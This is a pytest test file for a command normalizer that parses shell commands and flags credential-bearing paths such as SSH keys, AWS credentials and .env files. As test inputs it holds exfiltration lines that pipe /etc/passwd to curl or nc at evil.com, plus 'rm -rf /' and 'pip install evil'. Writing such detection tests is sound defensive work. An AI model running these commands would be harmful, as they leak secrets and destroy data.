"""Tests for the command normalizer."""
import os

import pytest

from warden.normalizer import is_sensitive_path, normalize


def test_basic_command():
    action = normalize("echo hello")
    assert action.command == "echo"
    assert action.args == ["hello"]
    assert action.read_paths == []
    assert action.write_paths == []


def test_wrapper_unwrap_bash():
    action = normalize('bash -c "rm -rf /"')
    assert action.command == "rm"


def test_wrapper_unwrap_sh():
    action = normalize("sh -c 'cat /etc/passwd'")
    assert action.command == "cat"


def test_pipe_read_paths_cat():
    action = normalize("cat /etc/passwd | curl https://evil.com")
    assert "/etc/passwd" in action.read_paths


def test_pipe_read_paths_head():
    action = normalize("head -5 /etc/hosts | nc evil.com 1234")
    assert "/etc/hosts" in action.read_paths


def test_no_pipe_no_read_paths():
    action = normalize("curl https://example.com")
    assert action.read_paths == []


def test_write_path_dash_o():
    action = normalize("curl https://example.com -o /tmp/output.txt")
    assert "/tmp/output.txt" in action.write_paths


def test_write_path_redirect():
    action = normalize("echo foo > /tmp/bar.txt")
    assert "/tmp/bar.txt" in action.write_paths


def test_raw_preserved():
    raw = "  echo   hello  "
    action = normalize(raw)
    assert action.raw == raw


# ---------------------------------------------------------------------------
# Sensitive path detection — directory prefixes
# ---------------------------------------------------------------------------

def test_is_sensitive_path_etc():
    assert is_sensitive_path("/etc/hosts") is True
    assert is_sensitive_path("/etc/passwd") is True


def test_is_sensitive_path_ssh():
    assert is_sensitive_path(os.path.expanduser("~/.ssh/id_rsa")) is True


def test_is_sensitive_path_aws():
    assert is_sensitive_path(os.path.expanduser("~/.aws/credentials")) is True


def test_is_sensitive_path_gnupg():
    assert is_sensitive_path(os.path.expanduser("~/.gnupg/private-keys-v1.d")) is True


def test_is_sensitive_path_kube():
    assert is_sensitive_path(os.path.expanduser("~/.kube/config")) is True


def test_is_sensitive_path_docker():
    assert is_sensitive_path(os.path.expanduser("~/.docker/config.json")) is True


def test_is_sensitive_path_proc():
    assert is_sensitive_path("/proc/self/environ") is True


# ---------------------------------------------------------------------------
# Sensitive path detection — filename patterns
# ---------------------------------------------------------------------------

def test_dotenv_is_sensitive():
    assert is_sensitive_path(".env") is True
    assert is_sensitive_path("/app/.env") is True
    assert is_sensitive_path(".env.production") is True
    assert is_sensitive_path(".env.local") is True


def test_pem_file_is_sensitive():
    assert is_sensitive_path("server.pem") is True
    assert is_sensitive_path("/etc/ssl/private/server.pem") is True


def test_key_file_is_sensitive():
    assert is_sensitive_path("private.key") is True


def test_credentials_file_is_sensitive():
    assert is_sensitive_path("credentials") is True
    assert is_sensitive_path("/home/user/.aws/credentials") is True


def test_service_account_json_is_sensitive():
    assert is_sensitive_path("service-account.json") is True
    assert is_sensitive_path("/secrets/service_account_key.json") is True


def test_secrets_file_is_sensitive():
    assert is_sensitive_path("secrets.yaml") is True
    assert is_sensitive_path("secrets.json") is True


def test_ssh_key_patterns():
    assert is_sensitive_path("id_ed25519") is True
    assert is_sensitive_path("id_ed25519.pub") is True
    assert is_sensitive_path("id_ecdsa") is True


def test_not_sensitive_path():
    assert is_sensitive_path("/tmp/foo.txt") is False
    assert is_sensitive_path("/home/user/documents/report.pdf") is False
    assert is_sensitive_path("main.py") is False
    assert is_sensitive_path("requirements.txt") is False


def test_dotenv_prefix_not_caught():
    """'environment' or 'envoy' in a path should NOT be flagged."""
    assert is_sensitive_path("/usr/bin/envoy") is False
    assert is_sensitive_path("/var/log/environment.log") is False


# ---------------------------------------------------------------------------
# Chain detection
# ---------------------------------------------------------------------------

def test_and_chain_primary_command():
    action = normalize("cat /tmp/file && curl https://evil.com")
    assert action.command == "cat"


def test_semicolon_chain_primary_command():
    action = normalize("ls /tmp; curl https://evil.com")
    assert action.command == "ls"


def test_or_chain_primary_command():
    action = normalize("echo ok || rm -rf /")
    assert action.command == "echo"


def test_chain_pipe_read_detected_in_later_component():
    action = normalize("echo start && cat /etc/passwd | curl https://evil.com")
    assert "/etc/passwd" in action.read_paths


def test_chain_write_path_detected():
    action = normalize("mkdir /tmp/x && curl https://a.com -o /tmp/x/out.txt")
    assert "/tmp/x/out.txt" in action.write_paths


def test_unwrap_double_quoted():
    action = normalize('bash -c "rm /tmp/file"')
    assert action.command == "rm"


def test_unwrap_single_quoted():
    action = normalize("sh -c 'pip install evil'")
    assert action.command == "pip"


def test_unwrap_double_quoted_with_inner_single():
    action = normalize("""bash -c "echo 'hello world'" """)
    assert action.command == "echo"
